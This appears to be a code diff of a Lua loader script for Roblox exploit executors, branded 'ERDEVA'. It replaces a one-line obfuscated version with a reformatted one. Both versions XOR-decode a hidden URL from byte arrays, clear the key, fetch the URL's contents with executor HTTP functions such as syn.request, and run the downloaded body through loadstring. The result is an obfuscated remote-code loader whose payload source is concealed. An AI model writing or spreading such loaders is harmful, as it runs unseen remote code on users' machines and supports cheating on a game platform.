@@ -1,1 +1,46 @@
-local _0xO=string.char;local _0xI=string.byte;local _0xL=bit32 and bit32.bxor or function(a,b)local r,m=0,1 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then r=r+m end a,b,m=(a-ra)/2,(b-rb)/2,m*2 end return r end;local _0xK={147,202,233,181,99,142,210,77,163,88};local _0xD={243,182,149,213,41,237,173,62,209,42,175,185,131,213,41,239,182,62,197,34,185,163,149,213,41,239,183,62,198,40,185,163,131,213,41,239,183,62,195,40,185,174,131,213,41,237,178,62,209,46,177,184,149,213,41,239,183,62,195,40,185,163,149,213,41,239,183,62,195,40};local function _0xG()local s={}for i=1,#_0xD do local k=_0xK[((i-1)%#_0xK)+1]s[#s+1]=_0xO(_0xL(_0xD[i],k))end table.clear(_0xD)table.clear(_0xK)return table.concat(s)end;local _0xU=_0xG();local _0xR=(syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request;if _0xR then local _res=_0xR({Url=_0xU,Method="GET",Headers={["User-Agent"]="ERDEVA-Shield"}}) _0xU=nil if _res and (_res.StatusCode==200 or _res.Status==200) and _res.Body and #_res.Body>20 then local _fn,_err=loadstring(_res.Body) if _fn then _fn() else warn(_err) end end else local _res=game:HttpGet(_0xU) _0xU=nil if _res and #_res>20 then loadstring(_res)() end end
+local _f = (request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request))
+local _k = {147,202,233,181,99,142,210,77,163,88}
+local _d = {243,182,149,213,41,237,173,62,209,42,175,185,131,213,41,239,182,62,197,34,185,163,149,213,41,239,183,62,198,40,185,163,131,213,41,239,183,62,195,40,185,174,131,213,41,237,178,62,209,46,177,184,149,213,41,239,183,62,195,40,185,163,149,213,41,239,183,62,195,40}
+
+local function _dec()
+    local s = {}
+    for i = 1, #_d do
+        local key = _k[((i - 1) % #_k) + 1]
+        local a, b = _d[i], key
+        local r, m = 0, 1
+        while a > 0 or b > 0 do
+            local ra, rb = a % 2, b % 2
+            if ra ~= rb then r = r + m end
+            a, b, m = (a - ra) / 2, (b - rb) / 2, m * 2
+        end
+        s[#s + 1] = string.char(r)
+    end
+    table.clear(_d)
+    table.clear(_k)
+    return table.concat(s)
+end
+
+local _url = _dec()
+
+if _f then
+    local res = _f({
+        Url = _url,
+        Method = "GET",
+        Headers = {
+            ["User-Agent"] = "Roblox/ERDEVA"
+        }
+    })
+    _url = nil
+    if res and (res.StatusCode == 200 or res.Status == 200) and res.Body and #res.Body > 20 then
+        local fn, err = loadstring(res.Body)
+        if fn then
+            fn()
+        else
+            warn("[ERDEVA] Syntax Error: " .. tostring(err))
+        end
+    else
+        warn("[ERDEVA] Server Connection Failed!.")
+    end
+else
+    warn("[Erorrr.")
+end
